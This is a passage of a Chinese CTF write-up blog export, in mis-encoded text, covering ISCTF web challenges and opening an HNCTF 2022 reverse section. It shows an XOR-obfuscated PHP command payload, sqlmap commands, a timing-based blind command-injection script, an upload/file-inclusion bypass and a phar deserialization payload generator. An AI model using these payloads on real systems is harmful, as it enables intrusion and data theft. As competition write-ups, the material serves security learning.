&quot;\&quot;^\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%ff&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\&quot;)&quot;;</span><br></pre></td></tr></table></figure><p>Payload:<code>?shell=(&quot;%8c%86%8c%8b%9a%92&quot;^&quot;%ff%ff%ff%ff%ff%ff&quot;)(&quot;%8b%9e%9c%df%d0%99%d5&quot;^&quot;%ff%ff%ff%ff%ff%ff%ff&quot;);</code></p><p>ISCTF{11bdd027-5e99-4e21-b066-02dc1c125724}</p><h2 id="å‚»æ³¨"><a href="#å‚»æ³¨" class="headerlink" title="å‚»æ³¨"></a>å‚»æ³¨</h2><p>æ‰¾ä¸€ä¸‹ç™»å½•ç•Œé¢login.php</p><p><img src="https://s2.loli.net/2023/08/04/wIVkh6aFc7uSp8Y.png" alt="04c21f4583e14b4f9069deccc6f4d4d8.png"></p><p>æ ¹æ®é¢˜ç›®çŒœæµ‹ï¼Œè¿™æ˜¯ä¸€é“sqlæ³¨å…¥çš„é¢˜ç›®</p><p>burp suitç®€å•æ‰«ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨uaæ³¨å…¥ï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­</p><p>æŸ¥çœ‹æ•°æ®åº“<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 --dbs</code></p><p><img src="https://s2.loli.net/2023/08/04/OAn6hJuBWV4wGQC.png" alt="4b8a9a503af6421ab11c8905eda0dff1.png"></p><p>æŸ¥çœ‹è¡¨<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf --tables</code></p><p><img src="https://s2.loli.net/2023/08/04/4wOi3FytCPSHx8f.png" alt="c7ec92e83c96491aab2452445047b15f.png"></p><p>æŸ¥çœ‹user_agentså†…å®¹</p><p><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf -T user_agents --columns --dump</code></p><p><img src="https://s2.loli.net/2023/08/04/pnYeAkLmrZaSDBc.png" alt="b5c59d4a63654969a7bb6f5c0320d79a.png"></p><p>å¾—åˆ°flag</p><h2 id="easy-onlineshell"><a href="#easy-onlineshell" class="headerlink" title="easy-onlineshell"></a>easy-onlineshell</h2><p>æç¤ºæˆ‘ä»¬å…ˆæ‰«æä¸€ä¸‹ï¼Œdirsearchæ‰«æåå‘ç°www.zipæºç æ³„éœ²ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import flask</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">app = flask.<span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/www.zip&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">return_SourceCode</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">action_rce</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">    elif flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        action = flask.request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.<span class="title function_ invoke__">write</span>(action[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        res = subprocess.<span class="title function_ invoke__">run</span>([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(debug=True)</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å‘ç°æ˜¯åœ¨/rceè¿™ä¸ªè·¯ç”±æƒ…å†µä¸‹å°±å¯ä»¥é€šè¿‡POSTä¼ å…¥å‚æ•°actï¼Œç„¶åä¼ å…¥çš„å†…å®¹çš„é¦–ä½å’Œæœ«ä½éƒ½ä¼šè¢«è£å‰ªï¼Œç„¶åå†æ‰§è¡Œä¼ å…¥çš„å‚æ•°ã€‚ æ‰€ä»¥è¿™ä¸ªé¢˜ç›®å¯ä»¥é‡‡ç”¨å‘½ä»¤ç›²æ³¨ï¼Œåˆ©ç”¨sleepæ¥æ³¨å…¥ï¼ˆå¤‡æ³¨ï¼šé¢˜ç›®æç¤ºæ— å›æ˜¾shellï¼Œå°è¯•åå¼¹shellã€dnslogéƒ½å¤±è´¥ï¼Œæ„Ÿè§‰è¿™é¢˜æ— å›æ˜¾ä¸å‡ºç½‘ï¼Œå¯èƒ½è¿™ä¸ªé¶æœºæ˜¯ä¸è¿å¤–ç½‘çš„ã€‚ï¼‰</p><p>é‡‡ç”¨å‘½ä»¤ç›²æ³¨ï¼Œåˆ©ç”¨sleepæ¥æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://120.79.18.34:20650/rce&quot;</span></span><br><span class="line"></span><br><span class="line">strs = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dics = <span class="string">&quot;abcdefgh ijklmnopqrstuvwxyz&#123;&#125;[].1234567890QAZWSXEDCRFVTGBYHNUJMIKOLP?-&quot;</span></span><br><span class="line"><span class="keyword">for</span> num1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> st <span class="keyword">in</span> dics:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;act&#x27;</span>: <span class="string">&#x27;1a=`cat 1.txt`;if [ &quot;$&#123;&#x27;</span>+<span class="string">&#x27;a:&#123;&#125;:&#x27;</span>.<span class="built_in">format</span>(num1)+<span class="string">&#x27;1&#125;&quot; == &#x27;</span>+<span class="string">&#x27;&quot;&#123;&#125;&quot; ];then sleep 2;fi1&#x27;</span>.<span class="built_in">format</span>(st)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(num1)</span><br><span class="line">            strs = strs+st</span><br><span class="line">            <span class="built_in">print</span>(strs)</span><br><span class="line"><span class="built_in">print</span>(strs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/5rqj1YdHnRFzGhc.png" alt="image-20221106155842877.png">)</p><h2 id="crazy-onlineshell"><a href="#crazy-onlineshell" class="headerlink" title="crazy-onlineshell"></a>crazy-onlineshell</h2><p>åœ¨easy-onlineshellåŸºç¡€ä¸ŠåŠ äº†äº›è¿‡æ»¤ï¼ŒåŒæ¬¾è„šæœ¬ä¹Ÿèƒ½è·‘ã€‚</p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>ç›®å½•æ‰«ä¸€ä¸‹æ‰¾åˆ°www.rar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç»“åˆæ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ªjpgç„¶ååˆ©ç”¨è¿™ä¸ªåŒ…å«ï¼Œä¸Šä¼ æ–‡ä»¶å¦‚ä¸‹ï¼š</p><p>å…ˆä¸Šä¼ ä¸ªphpæ–‡ä»¶æŠŠContent-Type: application/octet-stream</p><p>æ”¹æˆimage/jpegï¼Œå‘ç°è¿˜æ˜¯éæ³•æ–‡ä»¶ï¼Œè¯´æ˜æ–‡ä»¶æœ¬èº«ä¹Ÿæœ‰éªŒè¯ã€‚é‚£ä¹ˆä¼ å…¥ï¼š</p><p><img src="https://s2.loli.net/2023/08/04/kL1RgqyB7cVsIdm.png" alt="image-20221108092202957.png"></p><p>æŠŠåç¼€å‘½æ”¹æˆjpgåä¸Šä¼ ï¼Œå†åŒ…å«å®ƒå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:http://120.79.18.34:20635/?file=uplO4d/exp.jpg</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/aERSGHOLwXFKV3P.png" alt="image-20221108092327637.png"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼Œå‘ç°æœ‰ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨file_existsæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>playload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);<span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//è®¾ç½®stubï¼Œstubæ˜¯ä¸€ä¸ªç®€å•çš„phpæ–‡ä»¶ã€‚PHPé€šè¿‡stubè¯†åˆ«ä¸€ä¸ªæ–‡ä»¶ä¸ºPHARæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç‚¹ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æµ‹</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpharæ–‡ä»¶ï¼Œæ³¨æ„phpiniä¸­phar.readonlyè®¾ç½®ä¸ºOffï¼Œæ”¹åç¼€ä¸ºjpg</p><p>ä¹‹åæ–‡ä»¶è¯»å–å®ƒï¼Œ?img_name=phar://upload/phar.jpg</p><p>ISCTF{597a25db-eaa2-473e-9893-a578645f1f818}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ISCTF </tag>
            
            <tag> wb </tag>
            
            <tag> pharååºåˆ—åŒ– </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022 å…¨æ–¹å‘éƒ¨åˆ†WP</title>
      <link href="/posts/9d7b.html"/>
      <url>/posts/9d7b.html</url>
      
        <content type="html"><![CDATA[<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="è¶…çº§ç­¾åˆ°"><a href="#è¶…çº§ç­¾åˆ°" class="headerlink" title="è¶…çº§ç­¾åˆ°"></a>è¶…çº§ç­¾åˆ°</h2><p><img src="https://s2.loli.net/2023/08/04/nE3w1mQdbVBuTFk.png" alt="image-20221012160242556.png"></p><p>é€»è¾‘å°±æ˜¯è¾“å…¥çš„Str1å’ŒStr2è¿›è¡Œæ¯”è¾ƒï¼Œflagå°±æ˜¯Str2ï¼Œä¸è¿‡è¿™é‡Œå½“Str2[j] == 111æ—¶è¢«æ›¿æ¢æˆStr2[j] == 48ã€‚å³æŠŠoæ›¿æ¢æˆ0ã€‚</p><p>NSSCTF{hell0_w0rld}</p><h2 id="è´æ–¯æ˜¯ä»€ä¹ˆä¹å™¨å•Šï¼Ÿ"><a href="#è´æ–¯æ˜¯ä»€ä¹ˆä¹å™¨å•Šï¼Ÿ" class="headerlink" title="è´æ–¯æ˜¯ä»€ä¹ˆä¹å™¨å•Šï¼Ÿ"></a>è´æ–¯æ˜¯ä»€ä¹ˆä¹å™¨å•Šï¼Ÿ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">124</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+13Ch] [rbp+BCh]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">    Str[i] -= i;</span><br><span class="line">  base64_encode(Str2, Str);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Stråšäº†ä¸ªå°æ··æ·†ï¼Œç„¶åç»è¿‡base64åŠ å¯†ã€‚é‚£ä¹ˆå¯†æ–‡å°±æ˜¯encã€‚</p><p><img src="https://s2.loli.net/2023/08/04/dacXPnpq2b4yuv8.png" alt="image-20221012161359666.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 